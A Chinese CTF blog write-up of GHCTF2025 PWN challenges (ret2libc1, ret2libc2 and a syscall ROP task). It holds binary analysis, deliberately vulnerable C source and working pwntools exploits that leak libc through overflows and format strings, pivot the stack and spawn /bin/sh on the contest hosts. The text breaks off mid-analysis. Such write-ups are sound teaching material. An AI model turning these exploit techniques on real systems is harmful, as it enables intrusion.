title="ret2libc1_分析1"></a>ret2libc1_分析1</h2><ul><li>拿到附件后老样子，还是先来<code>check</code>一下保护机制。发现没有开启<code>canary</code>和<code>pie</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309193608288.png" alt="image-20250309193608288"></p><ul><li>现在我们就来使用<code>IDA pro</code>对该程序进行反编译，先来查看一下<code>main</code>函数。这里<code>main</code>函数主要的执行逻辑就<code>3</code>点概括<ul><li>先输入输出初始化</li><li>进入循环，打印菜单，并且要用户输入选项</li><li>之后通过<code>switch</code>语句执行对应的选项。</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309195517274.png" alt="image-20250309195517274"></p><ul><li>然后我们查看菜单<code>menu()</code>，这个函数结合<code>main()</code>函数中的<code>switch</code>语句进行分析。这时我们发现：<ul><li>菜单中只有<code>6</code>个选项，而<code>main()</code>函数中却有<code>7</code>个选项，并且第<code>7</code>个选项还是<code>see_it</code></li><li>这时就会想到<code>see_it()</code>这个函数可能会有点问题</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309200149427.png" alt="image-20250309200149427"></p><ul><li>接下来我们还是逐个函数进行分析，先来分析<code>flower()</code>这个函数，我们将这个函数分为四个部分进行解读<ul><li>这就是模拟商店买花的一个函数</li><li>首先我们要确定买哪一种花，然后确定买多少朵这种花</li><li>之后我们就会根据我们所买花的种类进入相应的<code>case</code>，然后扣除相应的<code>money</code></li><li>在这里<code>money</code>是一个全局变量，保存在<code>bss</code>段上</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309200451652.png" alt="image-20250309200451652"></p><ul><li>接下来我们查看<code>books()</code>这个函数的逻辑也和<code>flower()</code>这个函数也一样<ul><li>也就是选择我们要买的书的种类和个数</li><li>然后进入对应的<code>case</code>语句</li><li>执行对应的判断语句以及扣钱</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309201346140.png" alt="image-20250309201346140"></p><ul><li>然后我们来查看<code>hell_money</code><ul><li>这个函数主要执行的就是使用<code>money</code>对换<code>hell_money</code>，<code>1money=1000hell_money</code></li><li>并且会对<code>hell_money</code>统计，将得到的<code>hell_money</code>的总数保存在全局变量中<code>what_can_I_say</code></li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309201829207.png" alt="image-20250309201829207"></p><ul><li>来看<code>clothing()</code>这个函数<ul><li>这个函数实现的就是购买衣服</li><li>购买后就会扣除相应的钱</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309202152701.png" alt="image-20250309202152701"></p><ul><li>现在来查看<code>shop()</code>函数<ul><li>这个函数就是让我们购买这一整个商店</li><li>买完这个商店后就可以对这个商店进行命名</li><li>注意这边就存在一个栈溢出的漏洞</li><li>所以我们要想办法把<code>money</code>增加到大于<code>100000</code></li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309202443440.png" alt="image-20250309202443440"></p><ul><li>在来查看<code>see_it()</code><ul><li>这边的话我们可以使用<code>hell_money</code>来换取<code>money</code></li><li>只要我们有足够的<code>hell_money</code>就可以换取足够的<code>money</code>，从而可以买下整个<code>shop</code>给<code>shop</code>命名</li><li>然后我们就可以进行栈溢出，<code>ret2libc</code>利用</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309202554215.png" alt="image-20250309202554215"></p><ul><li>这里我们再来查看一下全局变量和<code>data</code>段，会发现我们一开始的<code>what_can_I_say</code>变量的值为<code>？</code>，然后<code>moeny</code>一开始的值为<code>0x3e8</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309203846322.png" alt="image-20250309203846322"></p><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309203839855.png" alt="image-20250309203839855"></p><ul><li>所以我们本题的思路就是不断用<code>money</code>购买<code>holl_money</code>然后用<code>holl_money</code>购买<code>money</code>使得<code>money</code>能购买整个商店，然后<code>ret2libc</code></li><li>这题就不动态调试了</li></ul><h2 id="ret2libc1_exp"><a href="#ret2libc1-exp" class="headerlink" title="ret2libc1_exp"></a>ret2libc1_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;neww&quot;]</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc11&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28496</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hell_money</span>(<span class="params">count</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(count).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see_it</span>(<span class="params">count</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(count).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400d73</span></span><br><span class="line">ret = <span class="number">0x400579</span></span><br><span class="line">printf_got = <span class="number">0x602020</span></span><br><span class="line">func_addr = <span class="number">0x400B1E</span></span><br><span class="line">printf_plt = <span class="number">0x4005A0</span></span><br><span class="line">hell_money(<span class="number">100</span>)</span><br><span class="line">pause()</span><br><span class="line">see_it(<span class="number">10000</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(ret)+p64(pop_rdi)+p64(printf_got)+p64(printf_plt)</span><br><span class="line">payload += p64(func_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;it!!!\n&#x27;</span>)</span><br><span class="line">printf_addr = p.recvline()[:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf--&gt;&#x27;</span>,printf_addr)</span><br><span class="line">printf_addr = <span class="built_in">int</span>.from_bytes(printf_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = printf_addr -libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><ul><li><p>考点：<code>ret2libc</code>、<code>栈迁移</code>、<code>字符串格式化漏洞</code>，<code>ogg</code>、<code>在libc找rop</code></p></li><li><p>本题其实使用<code>system(&quot;/bin/sh&quot;)</code>或者<code>ogg</code>都可以打得出来，在使用<code>system(&quot;/bin/sh&quot;)</code>的时候可能需要稍微调整一下栈的距离</p></li><li>这题感觉是出的最有问题的一题，虽然考点比较多，给出的<code>ogg</code>本意是想让新生们了解一下<code>ogg</code>这个东西，为以后打堆的时候劫持<code>hook</code>的学习打下铺垫，这题还可以让新生知道，<code>libc</code>中也可以找<code>rop</code>链</li><li>源代码如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">gitf</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> str[<span class="number">0x10</span>]=<span class="string">&quot;hello world!\n&quot;</span>;</span><br><span class="line">        <span class="type">char</span> str1[<span class="number">0x20</span>];</span><br><span class="line">        <span class="built_in">printf</span>(str);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;give you a gift.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;show your magic\n&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,str1,<span class="number">0x60</span>);</span><br><span class="line">        __asm__(<span class="string">&quot;lea -0x30(%rbp),%rax;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        init();</span><br><span class="line">        func();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ret2libc2_分析1"><a href="#ret2libc2-分析1" class="headerlink" title="ret2libc2_分析1"></a>ret2libc2_分析1</h2><ul><li>我们来<code>check</code>一下这个附件，发现并没有开启<code>PIE</code>保护也没有开启<code>Canary</code>保护</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309222120594.png" alt="image-20250309222120594"></p><ul><li>接下来使用<code>IDA pro</code>对附件进行反编译，查看一下代码，先来查看一下<code>main</code>函数，<code>main</code>函数会调用<code>init</code>函数对输入输出进行初始化</li><li>然后就调用<code>func</code>函数</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309222442715.png" alt="image-20250309222442715"></p><ul><li>接下来我们就来分析<code>func()</code>函数<ul><li>这个函数首先会输出<code>hello world!</code>，注意这里存在一个格式化字符的漏洞</li><li>但是在<code>printf</code>输出<code>format</code>的内容之前，并没有<code>read</code>，并不能修改<code>format</code>的内容</li><li>我们先接下去看，这时我们看到这边存在一个栈溢出，并且<strong>很重要的一点</strong>就是我们我们read写入<code>buf</code>的地址比<code>format</code>的地址更低</li><li>所以我们在溢出<code>buf</code>的时候，我们同时也可以改写<code>format</code>的内容</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309222559379.png" alt="image-20250309222559379"></p><ul><li>接下来我们查看一下这个函数的汇编形式，我们可以注意到，在调用<code>read</code>函数后有一个<code>lea rax,[rbp+buf]</code>这个地址。这时我们溢出的时候就可以对这个<code>rax</code>进行一些利用</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309223051762.png" alt="image-20250309223051762"></p><ul><li>这时我们再查看这个程序的<code>rop</code>链，发现这个程序并没有我们想要的<code>gadget</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309223347969.png" alt="image-20250309223347969"></p><ul><li>所以我们就只能找别的方式利用栈溢出漏洞和字符串格式化漏洞。由于没有开启<code>PIE</code>，我们就可以先将这个程序返回到<code>mov rdi,rax</code>这个指令，我们就可以再次使用<code>printf</code>函数输出<code>format</code>的内容，而这次输出的<code>format</code>内容我们就不会输出<code>hello world!</code>。而是我们<code>read()</code>，溢出的一部分内容。</li><li>所以我们使用<code>read</code>在<code>format</code>这个地址中读入<code>%n$p</code>，这样我们就可以泄露指定地址</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309223455358.png" alt="image-20250309223455358"></p><h2 id="ret2libc2_分析2"><a href="#ret2libc2-分析2" class="headerlink" title="ret2libc2_分析2"></a>ret2libc2_分析2</h2><ul><li>接下来我们就可以动态调试查看一下调用<code>printf</code>时，确定偏移量，泄露栈上的libc地址。</li><li>这边可以泄露<code>__libc_start_call_main+128</code>的地址，这时我们可以确定偏移地址<code>0x7+0x9-1=0xF</code>（这个是错误的）<strong>注意并不能通过现在rsp指针指向的位置算出偏移，我们因为我们是修改返回地址，再调用<code>printf</code>函数泄露地址，但是在我们<code>ret</code>之前，我们执行了<code>leave</code>这个汇编代码，改变了<code>rsp</code>的值，所以我们真正确定偏移的时候应该是在执行<code>leave</code>语句后再确定偏移</strong></li><li>但是这个地址需要我们反编译<code>libc.so</code>文件，所以我在泄露的时候并不是泄露这个地址</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309224059341.png" alt="image-20250309224059341"></p><ul><li>我们接下去查看，会发现这边还可以泄露另一个<code>libc</code>的地址，即<code>__libc_start_main+128</code>，我们选用这个地址，这样可以使用<code>pwntools</code>自带的一些函数快速寻找到偏移</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309224319279.png" alt="image-20250309224319279"></p><ul><li>现在我们来真正确定偏移，我们才能计算出真正的偏移<ul><li><code>__libc_start_call_main+128</code>：<code>0x2+0x6-0x1=0x7</code></li><li><code>__libc_start_main+128</code>：<code>0x16+0x6-0x1=0x1B</code></li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309225237277.png" alt="image-20250309225237277"></p><ul><li>这边我们泄露了地址后，我们就可以对地址接收，然后得到<code>libc</code>的地址。</li><li><strong>这里还需要注意一点</strong>在第一次进行栈溢出操作的时候需要进行栈迁移操作，否则第二次程序在执行<code>ret</code>之前又会执行一次，<code>leave</code>操作</li><li>如果我们在栈溢出时随便填写<code>rbp</code>指向地址里面的内容就会出现一个问题，第一次<code>leave</code>后<code>rbp</code>跑到了不存在的内存地址。第二次<code>leave</code>时就会出现段错误</li><li>在第二次溢出的时候，还会执行一次<code>leave</code>，这时的<code>rbp</code>指向的位置，也不能随便覆盖一个值，也需要覆盖一个可读可写的地址</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310004005221.png" alt="image-20250310004005221"></p><ul><li>为什么栈迁移这边有做详细分析<a href="https://iyheart.github.io/2024/06/18/CTFblog/PWN系列blog/关于PWN中的疑问/">关于PWN中的疑问 | iyheart的博客</a></li><li><p>这里在栈迁移的时候还需要注意几点：</p><ul><li>栈迁移时最好不要迁移到<code>.bss</code>段开头的位置，否则之后在执行<code>system(&quot;/bin/sh&quot;)</code>时会将栈地址降低，这时栈地址跑到了不能可读可写的段上去了。</li><li>我们在栈迁移的时候最好就是迁移到<code>.bss</code>段偏高一点的地方。</li></ul></li><li><p>泄露之后就是正常的<code>ret2libc</code>去打了，这里其实<code>system(&quot;/bin/sh&quot;)</code>也可以打的出来，栈迁移时，迁移到的<code>.bss</code>段地址再高一点就不会报错</p></li><li>而我这边使用<code>onegadget</code>进行打，首先我们需要使用到<code>one_gadget</code>这个插件，之后我们使用如下命令，这时我们的窗口就会输出<code>onegadget</code>，我们来具体介绍一下这些东西</li><li>当我们泄露libc地址后计算出<code>ogg</code>的偏移，跳转执行<code>ogg</code>,如果我们的寄存器满足这些条件，那么我们就可以<code>getshell</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget ./libc.so.6</span><br></pre></td></tr></table></figure><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310005115495.png" alt="image-20250310005115495"></p><ul><li>这里我选用的是倒数第二个，这时我们还要构造一个<code>rop</code>链，将<code>rax</code>设置为<code>0</code>，由于我们前面栈迁移（第二次栈迁移）会将<code>rbp</code>指针保持在可读可写的<code>bss</code>段中，所以<code>rbp-0x48</code>可写是没问题的。</li><li>当我们<code>rbp</code>处于bss段地址比较高的地方，<code>rbp-0x70</code>这个地址保存的值一般都是<code>0</code>，所以<code>[rbp-0x70]=NULL</code>也满足。</li><li>然后我们再使用<code>pop rax</code>将<code>rax</code>设置为<code>0</code>就没问题了</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310005307327.png" alt="image-20250310005307327"></p><h2 id="ret2libc2_exp"><a href="#ret2libc2-exp" class="headerlink" title="ret2libc2_exp"></a>ret2libc2_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28323</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc2&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">bss_addr = <span class="number">0x404508</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2b</span>+<span class="string">b&#x27;%27$p&#x27;</span>+ p64(bss_addr+<span class="number">0x400</span>)+p64(<span class="number">0x401227</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">libc_start = p.recvline()[:<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak--&gt;&quot;</span>,libc_start)</span><br><span class="line">libc_start = <span class="built_in">int</span>(libc_start,<span class="number">16</span>)</span><br><span class="line">libc_addr = libc_start - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak---------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]+<span class="number">128</span>))</span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libc_addr + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libc_addr + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx = libc_addr + <span class="number">0x904a9</span></span><br><span class="line">pop_rax = libc_addr + <span class="number">0x45eb0</span></span><br><span class="line">ogg = libc_addr + <span class="number">0xebd43</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+ p64(bss_addr+<span class="number">0x500</span>) <span class="comment">#+ p64(pop_rax)+p64(0)+p64(ogg)</span></span><br><span class="line">payload+= p64(pop_rdi)+ p64(sh_addr)+ p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="你真会布栈吗"><a href="#你真会布栈吗？" class="headerlink" title="你真会布栈吗？"></a>你真会布栈吗？</h1><ul><li>考点：<code>syscall</code>、<code>布置rop链</code></li><li>这题的打的思路比较多，所以这边就多给几个exp</li><li>还有一件事，这题是塞的国际赛题，所以没源码</li></ul><h2 id="你真会布栈吗_分析"><a href="#你真会布栈吗？-分析" class="headerlink" title="你真会布栈吗？_分析"></a>你真会布栈吗？_分析</h2><ul><li>按照流程，先<code>check</code>一下，发现这个程序的保护机制全部没开。</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310010543822.png" alt="image-20250310010543822"></p><ul><li>这里我们来分析一下这个程序的运行逻辑，我们发现这个程序只有<code>_start函数</code>和<code>print</code>函数</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310011019651.png" alt="image-20250310011019651"></p><ul><li>我们一开始运行程序的时候会先运行<code>_start</code>这个函数，这个函数就相当于<code>main</code>函数，然后我们具体查看一下<code>_start</code>这个函数<ul><li>这个函数执行的逻辑其实就是，进行三次输出</li><li>然后将用户可以输入内容到栈上，可以写入<code>0x60</code>字节到栈上</li><li>之后会返回到<code>rsp</code>指向的地址处</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310011431918.png" alt="image-20250310011431918"></p><ul><li>这时我们再来查看一下<code>print</code>函数<ul><li>除了实现主要的输出功能外</li><li>我们还发现存在<code>xchg rax,r13</code>，这个指令就是交换<code>rax</code>和<code>r13</code>这两个寄存器的值</li><li>最后就是返回</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310011646315.png" alt="image-20250310011646315"></p><ul><li>接下来我们查看一下其他的<code>.text</code>段会发现有给<code>gadgets</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310015206503.png" alt="image-20250310015206503"></p><ul><li>接下来我们运行一下这个程序，发现这个程序在这边会输出乱码，接下来我们动调和接收一下</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310011924906.png" alt="image-20250310011924906"></p><h2 id="你真会布栈吗思路1_利用xchg-raxr13和栈地址"><a href="#你真会布栈吗？思路1-利用xchg-rax-r13和栈地址" class="headerlink" title="你真会布栈吗？思路1_利用xchg rax,r13和栈地址"></a>你真会布栈吗？思路1_利用xchg rax,r13和栈地址</h2><ul><li>如果知道栈上的地址，我们就可以直接写<code>/bin/sh</code>到栈上，然后计算好偏移即可。这时我们可以直接<code>syscall 59</code>。</li><li>所以我们就直接调用<code>gadget</code>进行布置栈，布置到这里<code>gadget</code>就算是利用完成了，这里我们还要注意，jmp到<code>gadgets</code>后<code>rsp</code>这个栈帧并没有增加，所以我们将程序<code>jmp</code>到<code>gadgets</code>的<code>pop_r15</code>这边，这样就可以让<code>rsp</code>指针先增大<code>0x8</code>，接下来才开始真正的布置栈</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310083114532.png" alt="image-20250310083114532"></p><ul><li>接下来我们看执行完<code>xchg</code>后会执行什么，发现执行<code>xchg</code>后会执行，<code>jmp [rsp]</code>，这时我们还可以继续布置栈</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310080228337.png" alt="image-20250310080228337"></p><ul><li>这时我们的寄存器已经是满足了，现在我们就来满足<code>rdi</code>的值为<code>/bin/sh</code>这个字符串的地址，由于我们的栈地址已知。我们这个时候就能将<code>/bin/sh</code>写入到栈上，这时我们就可以这样布置栈</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310083141646.png" alt="image-20250310083141646"></p><ul><li>这时我们可以计算偏移得到<code>/bin/sh</code>这个字符串的地址与我们接收到栈地址的偏移。接下来我们查看是否能打出来，这边发现已经能执行<code>execve</code>了，但是我们注意到<code>envp</code>这边还有点问题，导致我们<code>execve</code>无法正常调用</li></ul><p><img 